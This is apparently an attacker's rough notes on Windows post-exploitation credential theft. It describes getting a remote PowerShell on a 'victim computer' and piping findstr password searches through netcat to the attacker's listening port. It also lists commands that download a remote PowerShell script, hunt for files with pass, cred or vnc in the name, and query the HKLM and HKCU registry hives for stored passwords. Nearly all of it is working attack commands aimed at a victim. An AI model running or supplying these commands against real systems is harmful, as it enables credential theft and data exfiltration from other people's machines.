TO FORMAT

1) get a remote powershell instance on the victim computer, and netcat.
2) set the following vars:
$ip = yourip
$port = exfiltration_port
$nc = /path/to/nc.exe

3) on your computer:
nc -nlp exfiltration_port > password-search.txt

4) on remote computer:
findstr /si password \*.xml \*.ini \*.txt | $nc $ip $port

echo $Env:PSModulePath

Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1

dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*

findstr /si password \*.xml \*.ini \*.txt

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s

